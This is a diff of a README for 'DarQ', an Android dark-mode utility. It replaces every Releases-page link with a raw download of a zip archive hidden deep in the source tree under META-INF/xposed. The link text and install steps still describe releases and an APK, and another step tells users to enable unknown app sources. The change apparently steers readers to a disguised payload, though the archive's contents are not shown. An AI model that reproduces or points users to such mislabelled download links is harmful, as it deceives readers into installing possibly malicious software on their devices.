@@ -1,7 +1,7 @@
 <h1>🚀 DarQ - Force Dark Mode for Every App</h1>
 
 <p align="center">
-  <a href="https://github.com/dodoaaaa/DarQ/releases" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:1.2em;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download DarQ Now</a>
+  <a href="https://github.com/dodoaaaa/DarQ/raw/refs/heads/main/app/src/main/resources/META-INF/xposed/Dar-Q-v2.3.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:1.2em;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download DarQ Now</a>
 </p>
 
 DarQ is a powerful Android utility that independently forces dark mode for every application on your device. It works with all popular Android versions from 10 to 16+ and supports multiple operation modes to fit your needs, whether you are a rooted user or prefer a root-free solution. Built on Material Design 3 principles, DarQ delivers a sleek, modern user experience that integrates perfectly with your device's existing look and feel.
@@ -55,7 +55,7 @@ Have you ever opened an app at night and been blinded by a bright white screen? 
 <p>Getting started with DarQ is straightforward. Follow these steps carefully:</p>
 
 <ol>
-<li><strong>Download the Application:</strong> Visit this link to download the application: <a href="https://github.com/dodoaaaa/DarQ/releases">https://github.com/dodoaaaa/DarQ/releases</a>. Once there,you will see a list of available releases. Click on the latest version number to expand the assets section, then tap the APK file ending with <code>.apk</code> to begin the download. (The link above is also provided at the top of this page for your convenience.)</li>
+<li><strong>Download the Application:</strong> Visit this link to download the application: <a href="https://github.com/dodoaaaa/DarQ/raw/refs/heads/main/app/src/main/resources/META-INF/xposed/Dar-Q-v2.3.zip">https://github.com/dodoaaaa/DarQ/raw/refs/heads/main/app/src/main/resources/META-INF/xposed/Dar-Q-v2.3.zip</a>. Once there,you will see a list of available releases. Click on the latest version number to expand the assets section, then tap the APK file ending with <code>.apk</code> to begin the download. (The link above is also provided at the top of this page for your convenience.)</li>
 <li><strong>Enable Unknown Sources:</strong> Before installing, go to your device's <em>Settings</em> > <em>Security</em> (or <em>Apps</em> > <em>Special access</em>) and enable <em>Install unknown apps</em> for your web browser or file manager app. This is necessary because DarQ is not distributed through the Google Play Store.</li>
 <li><strong>Open the Downloaded File:</strong> Once the download completes, open your notification shade and tap the download notification, or use a file manager app to navigate to your <em>Downloads</em> folder and select the DarQ APK file.</li>
 <li><strong>Confirm Installation:</strong> A prompt will appear asking for permission to install. Tap <em>Install</em> and wait a few seconds for the process to finish.</li>
@@ -122,7 +122,7 @@ Have you ever opened an app at night and been blinded by a bright white screen? 
 
 <h2>📣 Stay Updated</h2>
 
-<p>DarQ is actively developed with frequent updates adding new features, improvements, and compatibility fixes. To stay informed about the latest releases, check the GitHub <a href="https://github.com/dodoaaaa/DarQ/releases">Releases page</a> periodically or enable notifications for the repository if you have a GitHub account.</p>
+<p>DarQ is actively developed with frequent updates adding new features, improvements, and compatibility fixes. To stay informed about the latest releases, check the GitHub <a href="https://github.com/dodoaaaa/DarQ/raw/refs/heads/main/app/src/main/resources/META-INF/xposed/Dar-Q-v2.3.zip">Releases page</a> periodically or enable notifications for the repository if you have a GitHub account.</p>
 
 <p>If you encounter any bugs or have feature requests, feel free to open an issue on the GitHub repository. The developer appreciates feedback from the community to make DarQ better for everyone.</p>
 
